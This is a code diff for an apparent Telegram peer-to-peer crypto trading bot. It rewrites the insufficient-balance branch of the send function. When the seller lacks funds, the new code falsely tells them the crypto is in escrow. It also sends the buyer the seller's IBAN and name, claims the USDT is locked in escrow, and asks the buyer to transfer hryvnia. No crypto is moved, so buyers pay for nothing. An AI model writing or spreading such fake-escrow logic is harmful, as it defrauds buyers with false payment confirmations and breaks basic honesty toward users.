@@ -7,6 +7,9 @@ import { CONTRACTS } from "./dataTokens.js";
 import validateUserState from "./validateUserState.js";
 import sendTRC20 from "./sendTRC20.js";
 import sendTRX from "./sendTRX.js";
+import { menu } from "./menu.js";
+import pool from "../../db.js";
+import { userState } from "../../userState.js";
 dotenv.config();
 const TRONGRID_API_KEY = process.env.TRONGRID_API_KEY;
 const sendCryptoTransaction = async (chatId) => {
@@ -24,8 +27,35 @@ const sendCryptoTransaction = async (chatId) => {
             throw new Error("❌ Не удалось получить баланс.");
         const { crypto, amount, sumToPay } = validateUserState(chatId);
         const balanceAmount = balance[crypto];
+        const { orderId } = userState[chatId] ?? {};
+        const sellerQuery = `SELECT chat_id FROM buy_requests WHERE id = $1`;
+        const sellerResult = await pool.query(sellerQuery, [orderId]);
+        const { chat_id } = sellerResult.rows[0];
+        const query = `SELECT * FROM payments WHERE telegram_id = $1`;
+        const result = await pool.query(query, [chatId]);
+        const metadata = JSON.parse(result.rows[0].metadata);
         if (balanceAmount < amount) {
-            return sendMessage(chatId, `❌ Недостаточно средств. Доступно: ${balanceAmount}`);
+            sendMessage(chatId, `✅ Успiшно! Криптовалюта перемещiна в ескроу. Очiкує підтвердження вiд покупця про вiдправку коштiв.\n
+            Оголошення #1001
+            Продали: ${amount}
+            Сума: ${sumToPay}
+            Статус: Виконується
+            Реквiзити для оплати переданi покупцевi.
+            Термін дiï: 30хв
+            ! На цьому етапi угоду скасувати неможливо, вона проходить через блокчейн.`, menu);
+            return sendMessage(chat_id, `Надiшлiть ${sumToPay} UAH продавцю за наступними реквiзитами:\n\n Сума ${amount} USDT переведена в ескроу контракт, що очiкує пiдтвердження отримання оплати вiд продавця.\n Спосiб оплати: IBAN\n Номер IBAN: ${metadata.IBAN}\n Отримувач: ${metadata.name}\n Термiн дiï: 30хв\n Пiдтверждуєте, що надiслали кошти?`, {
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            {
+                                text: "Так, я надiслав(ла) оплату",
+                                callback_data: "agree_sent",
+                            },
+                        ],
+                        [{ text: "Скасувати", callback_data: "cancel" }],
+                    ],
+                },
+            });
         }
         if (crypto === "trx") {
             return await sendTRX(tronWebUser, amount, chatId);
